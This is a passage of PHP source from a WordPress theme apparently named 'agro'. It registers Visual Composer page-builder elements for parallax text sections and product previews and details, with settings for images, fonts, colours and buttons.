            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgw',
                'heading' => esc_html__('Section Image Width', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgh',
                'heading' => esc_html__('Section Image Height', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'anim',
                'heading' => esc_html__('Add animation?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' )
            ),
            array(
                'type' => 'dropdown',
                'param_name' => 'aos',
                'heading' => esc_html__('Animation', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
                'value' => bon_anim_aos(),
                'dependency' => array(
                    'element' => 'anim',
                    'not_empty' => true
                ),
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'duration',
                'heading' => esc_html__('Animation duration', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
                'dependency' => array(
                    'element' => 'anim',
                    'not_empty' => true
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'offset',
                'heading' => esc_html__('Animation offset', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
                'dependency' => array(
                    'element' => 'anim',
                    'not_empty' => true
                )
            ),
            // fonts
            array(
                'type' => 'nt_spacer',
                'param_name' => 'fonts_spacer',
                'heading' => esc_html__('Heading Fonts Customize', 'agro'),
                'group' => esc_html__('Fonts', 'agro')
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'usefonts',
                'heading' => esc_html__('Use Google Fonts?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'description' => esc_html__('If checked, the section background image will be disabled on max 992px.', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Heading tag', 'agro'),
                'param_name' => 'htag',
                'group' => esc_html__('Fonts', 'agro'),
                'value' => array(
                    esc_html__('Select tag', 'agro') => '',
                    esc_html__('h1', 'agro') => 'h1',
                    esc_html__('h2', 'agro') => 'h2',
                    esc_html__('h3', 'agro') => 'h3',
                    esc_html__('h4', 'agro') => 'h4',
                    esc_html__('h5', 'agro') => 'h5',
                    esc_html__('h6', 'agro') => 'h6',
                    esc_html__('div', 'agro') => 'div',
                    esc_html__('p', 'agro') => 'p',
                    esc_html__('span', 'agro') => 'span'
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'tsize',
                'heading' => esc_html__('Font size', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'lheight',
                'heading' => esc_html__('Line height', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'google_fonts',
                'param_name' => 'google_fonts',
                'value' => 'font_family:Abril%20Fatface%3Aregular|font_style:400%20regular%3A400%3Anormal',
                'group' => esc_html__('Fonts', 'agro'),
                'settings' => array(
                    'fields' => array(
                        'font_family_description' => esc_html__( 'Select font family.', 'agro' ),
                        'font_style_description' => esc_html__( 'Select font styling.', 'agro' )
                    )
                ),
                'dependency' => array(
                    'element' => 'usefonts',
                    'not_empty' => true
                )
            ),
            // color
            //Background CSS
            array(
                'type' => 'css_editor',
                'param_name' => 'css',
                'heading' => esc_html__('Background CSS', 'agro'),
                'group' => esc_html__('Background', 'agro')
            )
        )));
    }
}


/*******************************/
/* parallaxtext
/******************************/
if (!function_exists('agro_parallaxtext_integrateWithVC')) {
    add_action('vc_before_init', 'agro_parallaxtext_integrateWithVC');
    function agro_parallaxtext_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('Parallax Text', 'agro'),
        'base' => 'agro_parallaxtext',
        'icon' => 'nt_logo',
        'category' => 'AGRO',
        'params' => array(
            array(
                'type' => 'textfield',
                'param_name' => 'stitle',
                'heading' => esc_html__('Section Title', 'agro'),
                'edit_field_class' => 'vc_col-sm-6 pt15',
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'sthintitle',
                'heading' => esc_html__('Section Thin Title', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
            ),
            array(
                'type' => 'textarea',
                'param_name' => 'desc',
                'heading' => esc_html__('Section Description', 'agro'),
            ),
            array(
                'type' => 'vc_link',
                'param_name' => 'link',
                'heading' => esc_html__('Section Button', 'agro'),
            ),
            array(
                'type' => 'attach_image',
                'param_name' => 'bgimg',
                'heading' => esc_html__('Background Parallax Image', 'agro'),
                'group' => esc_html__('Images', 'agro'),
                'edit_field_class' => 'vc_col-sm-4 pt15',
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'bgimgw',
                'heading' => esc_html__('Background Image width', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'group' => esc_html__('Images', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'bgimgh',
                'heading' => esc_html__('Background Image height', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'group' => esc_html__('Images', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'attach_image',
                'param_name' => 'img1',
                'heading' => esc_html__('Image 1', 'agro'),
                'group' => esc_html__('Images', 'agro'),
                'edit_field_class' => 'vc_col-sm-3',
            ),
            array(
                'type' => 'attach_image',
                'param_name' => 'img2',
                'heading' => esc_html__('Image 2', 'agro'),
                'group' => esc_html__('Images', 'agro'),
                'edit_field_class' => 'vc_col-sm-3',
            ),
            array(
                'type' => 'attach_image',
                'param_name' => 'img3',
                'heading' => esc_html__('Image 3', 'agro'),
                'group' => esc_html__('Images', 'agro'),
                'edit_field_class' => 'vc_col-sm-3',
            ),
            array(
                'type' => 'attach_image',
                'param_name' => 'img4',
                'heading' => esc_html__('Image 4', 'agro'),
                'group' => esc_html__('Images', 'agro'),
                'edit_field_class' => 'vc_col-sm-3',
            ),
            // fonts
            array(
                'type' => 'nt_spacer',
                'param_name' => 'fonts_spacer',
                'heading' => esc_html__('Heading Fonts Customize', 'agro'),
                'group' => esc_html__('Fonts', 'agro')
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'usefonts',
                'heading' => esc_html__('Use Google Fonts?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'description' => esc_html__('If checked, the section background image will be disabled on max 992px.', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Heading tag', 'agro'),
                'param_name' => 'htag',
                'group' => esc_html__('Fonts', 'agro'),
                'value' => array(
                    esc_html__('Select tag', 'agro') => '',
                    esc_html__('h1', 'agro') => 'h1',
                    esc_html__('h2', 'agro') => 'h2',
                    esc_html__('h3', 'agro') => 'h3',
                    esc_html__('h4', 'agro') => 'h4',
                    esc_html__('h5', 'agro') => 'h5',
                    esc_html__('h6', 'agro') => 'h6',
                    esc_html__('div', 'agro') => 'div',
                    esc_html__('p', 'agro') => 'p',
                    esc_html__('span', 'agro') => 'span'
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'tsize',
                'heading' => esc_html__('Font size', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'lheight',
                'heading' => esc_html__('Line height', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'google_fonts',
                'param_name' => 'google_fonts',
                'value' => 'font_family:Abril%20Fatface%3Aregular|font_style:400%20regular%3A400%3Anormal',
                'group' => esc_html__('Fonts', 'agro'),
                'settings' => array(
                    'fields' => array(
                        'font_family_description' => esc_html__( 'Select font family.', 'agro' ),
                        'font_style_description' => esc_html__( 'Select font styling.', 'agro' )
                    )
                ),
                'dependency' => array(
                    'element' => 'usefonts',
                    'not_empty' => true
                )
            ),
            // color
            array(
                'type' => 'nt_spacer',
                'param_name' => 'sec_spacer',
                'heading' => esc_html__('Section Text Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'tclr',
                'heading' => esc_html__('Title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'thclr',
                'heading' => esc_html__('Thin title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'descclr',
                'heading' => esc_html__('Description color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'nt_spacer',
                'param_name' => 'btn_spacer',
                'heading' => esc_html__('Button Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Button type', 'agro'),
                'param_name' => 'btntype',
                'edit_field_class' => 'vc_col-sm-4',
                'group' => esc_html__('Color', 'agro'),
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('Round', 'agro') => 'btn-round',
                    esc_html__('Square', 'agro') => 'btn-square',
                    esc_html__('Rounded', 'agro') => 'btn-rounded'
                )
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Button style', 'agro'),
                'param_name' => 'btnstyle',
                'edit_field_class' => 'vc_col-sm-4',
                'group' => esc_html__('Color', 'agro'),
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('Outline to Solid', 'agro') => 'custom-btn--style-3',
                    esc_html__('Solid to Outline', 'agro') => 'custom-btn--style-4'
                )
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Button size', 'agro'),
                'param_name' => 'btnsize',
                'edit_field_class' => 'vc_col-sm-4',
                'group' => esc_html__('Color', 'agro'),
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('Big', 'agro') => 'custom-btn--big',
                    esc_html__('Medium', 'agro') => 'custom-btn--medium',
                    esc_html__('Small', 'agro') => 'custom-btn--small'
                )
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr2',
                'group' => esc_html__('Color', 'agro'),
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnbg',
                'heading' => esc_html__('Button background', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnhvrbg',
                'heading' => esc_html__('Hover button background', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr3',
                'group' => esc_html__('Color', 'agro'),
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnclr',
                'heading' => esc_html__('Button title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnhvrclr',
                'heading' => esc_html__('Hover button title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr4',
                'group' => esc_html__('Color', 'agro'),
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnbrd',
                'heading' => esc_html__('Button border color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnhvrbrd',
                'heading' => esc_html__('Hover button border color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            //Background CSS
            array(
                'type' => 'css_editor',
                'param_name' => 'css',
                'heading' => esc_html__('Background CSS', 'agro'),
                'group' => esc_html__('Background', 'agro')
            )
        )));
    }
}

/*******************************/
/* parallaxtext 2
/******************************/
if (!function_exists('agro_parallaxtext2_integrateWithVC')) {
    add_action('vc_before_init', 'agro_parallaxtext2_integrateWithVC');
    function agro_parallaxtext2_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('Parallax Text 2', 'agro'),
        'base' => 'agro_parallaxtext2',
        'icon' => 'nt_logo',
        'category' => 'AGRO',
        'params' => array(
            array(
                'type' => 'textfield',
                'param_name' => 'stitle',
                'heading' => esc_html__('Section Title', 'agro'),
                'edit_field_class' => 'vc_col-sm-6 pt15',
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'sthintitle',
                'heading' => esc_html__('Section Thin Title', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Section Description Type', 'agro'),
                'param_name' => 'dtype',
                'value' => array(
                    esc_html__('Default', 'agro') => 'd',
                    esc_html__('Custom HTML', 'agro') => 'custom',
                )
            ),
            array(
                'type' => 'textarea',
                'param_name' => 'desc',
                'heading' => esc_html__('Section Description', 'agro'),
                'dependency' => array(
                    'element' => 'dtype',
                    'value' => 'd',
                )
            ),
            array(
                'type' => 'textarea_html',
                'param_name' => 'content',
                'heading' => esc_html__('Section Description', 'agro'),
                'dependency' => array(
                    'element' => 'dtype',
                    'value' => 'custom',
                )
            ),
            array(
                'type' => 'vc_link',
                'param_name' => 'link',
                'heading' => esc_html__('Section Button', 'agro'),
            ),
            array(
                'type' => 'attach_image',
                'param_name' => 'bgimg',
                'heading' => esc_html__('Background Parallax Image', 'agro'),
                'group' => esc_html__('Images', 'agro'),
                'edit_field_class' => 'vc_col-sm-4 pt15',
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'bgimgw',
                'heading' => esc_html__('Background Image width', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'group' => esc_html__('Images', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'bgimgh',
                'heading' => esc_html__('Background Image height', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'group' => esc_html__('Images', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            // fonts
            array(
                'type' => 'nt_spacer',
                'param_name' => 'fonts_spacer',
                'heading' => esc_html__('Heading Fonts Customize', 'agro'),
                'group' => esc_html__('Fonts', 'agro')
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'usefonts',
                'heading' => esc_html__('Use Google Fonts?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'description' => esc_html__('If checked, the section background image will be disabled on max 992px.', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Heading tag', 'agro'),
                'param_name' => 'htag',
                'group' => esc_html__('Fonts', 'agro'),
                'value' => array(
                    esc_html__('Select tag', 'agro') => '',
                    esc_html__('h1', 'agro') => 'h1',
                    esc_html__('h2', 'agro') => 'h2',
                    esc_html__('h3', 'agro') => 'h3',
                    esc_html__('h4', 'agro') => 'h4',
                    esc_html__('h5', 'agro') => 'h5',
                    esc_html__('h6', 'agro') => 'h6',
                    esc_html__('div', 'agro') => 'div',
                    esc_html__('p', 'agro') => 'p',
                    esc_html__('span', 'agro') => 'span'
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'tsize',
                'heading' => esc_html__('Font size', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'lheight',
                'heading' => esc_html__('Line height', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'google_fonts',
                'param_name' => 'google_fonts',
                'value' => 'font_family:Abril%20Fatface%3Aregular|font_style:400%20regular%3A400%3Anormal',
                'group' => esc_html__('Fonts', 'agro'),
                'settings' => array(
                    'fields' => array(
                        'font_family_description' => esc_html__( 'Select font family.', 'agro' ),
                        'font_style_description' => esc_html__( 'Select font styling.', 'agro' )
                    )
                ),
                'dependency' => array(
                    'element' => 'usefonts',
                    'not_empty' => true
                )
            ),
            // color
            array(
                'type' => 'nt_spacer',
                'param_name' => 'sec_spacer',
                'heading' => esc_html__('Section Text Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'tclr',
                'heading' => esc_html__('Title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'thclr',
                'heading' => esc_html__('Thin title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'descclr',
                'heading' => esc_html__('Description color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'nt_spacer',
                'param_name' => 'btn_spacer',
                'heading' => esc_html__('Button Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Button type', 'agro'),
                'param_name' => 'btntype',
                'edit_field_class' => 'vc_col-sm-4',
                'group' => esc_html__('Color', 'agro'),
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('Round', 'agro') => 'btn-round',
                    esc_html__('Square', 'agro') => 'btn-square',
                    esc_html__('Rounded', 'agro') => 'btn-rounded'
                )
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Button style', 'agro'),
                'param_name' => 'btnstyle',
                'edit_field_class' => 'vc_col-sm-4',
                'group' => esc_html__('Color', 'agro'),
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('Outline to Solid', 'agro') => 'custom-btn--style-3',
                    esc_html__('Solid to Outline', 'agro') => 'custom-btn--style-4'
                )
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Button size', 'agro'),
                'param_name' => 'btnsize',
                'edit_field_class' => 'vc_col-sm-4',
                'group' => esc_html__('Color', 'agro'),
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('Big', 'agro') => 'custom-btn--big',
                    esc_html__('Medium', 'agro') => 'custom-btn--medium',
                    esc_html__('Small', 'agro') => 'custom-btn--small'
                )
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr2',
                'group' => esc_html__('Color', 'agro'),
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnbg',
                'heading' => esc_html__('Button background', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnhvrbg',
                'heading' => esc_html__('Hover button background', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr3',
                'group' => esc_html__('Color', 'agro'),
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnclr',
                'heading' => esc_html__('Button title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnhvrclr',
                'heading' => esc_html__('Hover button title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr4',
                'group' => esc_html__('Color', 'agro'),
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnbrd',
                'heading' => esc_html__('Button border color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnhvrbrd',
                'heading' => esc_html__('Hover button border color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            //Background CSS
            array(
                'type' => 'css_editor',
                'param_name' => 'css',
                'heading' => esc_html__('Background CSS', 'agro'),
                'group' => esc_html__('Background', 'agro')
            )
        )));
    }
}


/*******************************/
/* product_preview
/******************************/
if (!function_exists('agro_product_preview_integrateWithVC')) {
    add_action('vc_before_init', 'agro_product_preview_integrateWithVC');
    function agro_product_preview_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('Product Preview', 'agro'),
        'base' => 'agro_product_preview',
        'icon' => 'nt_logo',
        'category' => 'AGRO',
        'params' => array(
            array(
                'type' => 'param_group',
                'param_name' => 'loop',
                'heading' => esc_html__('Create Product Preview', 'agro'),
                'params' => array(
                    array(
                        'type' => 'attach_image',
                        'param_name' => 'img',
                        'heading' => esc_html__('Product image', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6',
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'title',
                        'heading' => esc_html__('Product title', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6',
                    ),
                    array(
                        'type' => 'vc_link',
                        'param_name' => 'link',
                        'heading' => esc_html__('Product link', 'agro'),
                    ),

                )
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Product SM Column Width', 'agro'),
                'description' => esc_html__('SM : Small Device', 'agro'),
                'param_name' => 'sm',
                'edit_field_class' => 'vc_col-sm-6',
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('1 column', 'agro') => 'col-sm-1',
                    esc_html__('2 column', 'agro') => 'col-sm-2',
                    esc_html__('3 column', 'agro') => 'col-sm-3',
                    esc_html__('4 column', 'agro') => 'col-sm-4',
                    esc_html__('5 column', 'agro') => 'col-sm-5',
                    esc_html__('6 column', 'agro') => 'col-sm-6',
                    esc_html__('7 column', 'agro') => 'col-sm-7',
                    esc_html__('8 column', 'agro') => 'col-sm-8',
                    esc_html__('9 column', 'agro') => 'col-sm-9',
                    esc_html__('10 column', 'agro') => 'col-sm-10',
                    esc_html__('11 column', 'agro') => 'col-sm-11',
                    esc_html__('12 column', 'agro') => 'col-sm-12'
                )
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Product LG Column Width', 'agro'),
                'description' => esc_html__('LG : Large Device', 'agro'),
                'param_name' => 'lg',
                'edit_field_class' => 'vc_col-sm-6',
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('1 column', 'agro') => 'col-lg-1',
                    esc_html__('2 column', 'agro') => 'col-lg-2',
                    esc_html__('3 column', 'agro') => 'col-lg-3',
                    esc_html__('4 column', 'agro') => 'col-lg-4',
                    esc_html__('5 column', 'agro') => 'col-lg-5',
                    esc_html__('6 column', 'agro') => 'col-lg-6',
                    esc_html__('7 column', 'agro') => 'col-lg-7',
                    esc_html__('8 column', 'agro') => 'col-lg-8',
                    esc_html__('9 column', 'agro') => 'col-lg-9',
                    esc_html__('10 column', 'agro') => 'col-lg-10',
                    esc_html__('11 column', 'agro') => 'col-lg-11',
                    esc_html__('12 column', 'agro') => 'col-lg-12'
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgw',
                'heading' => esc_html__('Product Image width', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgh',
                'heading' => esc_html__('Product Image height', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            //Background CSS
            array(
                'type' => 'nt_spacer',
                'param_name' => 'product_spacer',
                'heading' => esc_html__('Product Color Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'overlay',
                'heading' => esc_html__('Hover product overlay color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'tclr',
                'heading' => esc_html__('Title color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'thvrclr',
                'heading' => esc_html__('Hover title color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
                'group' => esc_html__('Color', 'agro')
            ),
            //Background CSS
            array(
                'type' => 'css_editor',
                'param_name' => 'css',
                'heading' => esc_html__('Background CSS', 'agro'),
                'group' => esc_html__('Background', 'agro')
            )
        )));
    }
}

/*******************************/
/* product details
/******************************/
if (!function_exists('agro_product_details_integrateWithVC')) {
    add_action('vc_before_init', 'agro_product_details_integrateWithVC');
    function agro_product_details_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('Product Details', 'agro'),
        'base' => 'agro_product_details',
        'icon' => 'nt_logo',
        'category' => 'AGRO',
        'params' => array(
            array(
                'type' => 'textfield',
                'param_name' => 'stitle',
                'heading' => esc_html__('Section Title', 'agro'),
                'edit_field_class' => 'vc_col-sm-6 pt15',
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'sthintitle',
                'heading' => esc_html__('Section Thin Title', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
            ),
            array(
                'type' => 'textarea_html',
                'param_name' => 'content',
                'heading' => esc_html__('Product Description', 'agro'),
            ),
            array(
                'type' => 'attach_image',
                'param_name' => 'img',
                'heading' => esc_html__('Product Image', 'agro'),
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgw',
                'heading' => esc_html__('Product Image Width', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgh',
                'heading' => esc_html__('Product Image Height', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            // product details
            array(
                'type' => 'textfield',
                'param_name' => 'subtitle',
                'heading' => esc_html__('Product Subtitle', 'agro'),
                'group' => esc_html__('Details', 'agro'),
                'edit_field_class' => 'vc_col-sm-6 pt15',
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'title',
                'heading' => esc_html__('Product Title', 'agro'),
                'group' => esc_html__('Details', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
            ),
            array(
                'type' => 'param_group',
                'param_name' => 'loop',
                'heading' => esc_html__('Create Product Deatils More', 'agro'),
                'group' => esc_html__('Details', 'agro'),
                'params' => array(
                    array(
                        'type' => 'textfield',
                        'param_name' => 'num',
                        'heading' => esc_html__('Deatail 1', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6 pt15',
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'dtitle',
                        'heading' => esc_html__('Deatail 2', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6',
                    ),
                )
            ),
            // fonts
            array(
                'type' => 'nt_spacer',
                'param_name' => 'fonts_spacer',
                'heading' => esc_html__('Heading Fonts Customize', 'agro'),
                'group' => esc_html__('Fonts', 'agro')
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'usefonts',
                'heading' => esc_html__('Use Google Fonts?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'description' => esc_html__('If checked, the section background image will be disabled on max 992px.', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Heading tag', 'agro'),
                'param_name' => 'htag',
                'group' => esc_html__('Fonts', 'agro'),
                'value' => array(
                    esc_html__('Select tag', 'agro') => '',
                    esc_html__('h1', 'agro') => 'h1',
                    esc_html__('h2', 'agro') => 'h2',
                    esc_html__('h3', 'agro') => 'h3',
                    esc_html__('h4', 'agro') => 'h4',
                    esc_html__('h5', 'agro') => 'h5',
                    esc_html__('h6', 'agro') => 'h6',
                    esc_html__('div', 'agro') => 'div',
                    esc_html__('p', 'agro') => 'p',
                    esc_html__('span', 'agro') => 'span'
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'tsize',
                'heading' => esc_html__('Font size', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'lheight',
                'heading' => esc_html__('Line height', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'google_fonts',
                'param_name' => 'google_fonts',
                'value' => 'font_family:Abril%20Fatface%3Aregular|font_style:400%20regular%3A400%3Anormal',
                'group' => esc_html__('Fonts', 'agro'),
                'settings' => array(
                    'fields' => array(
                        'font_family_description' => esc_html__( 'Select font family.', 'agro' ),
                        'font_style_description' => esc_html__( 'Select font styling.', 'agro' )
                    )
                ),
                'dependency' => array(
                    'element' => 'usefonts',
                    'not_empty' => true
                )
            ),
            // color
            array(
                'type' => 'nt_spacer',
                'param_name' => 'product_spacer',
                'heading' => esc_html__('Product Color Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'tclr',
                'heading' => esc_html__('Title color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
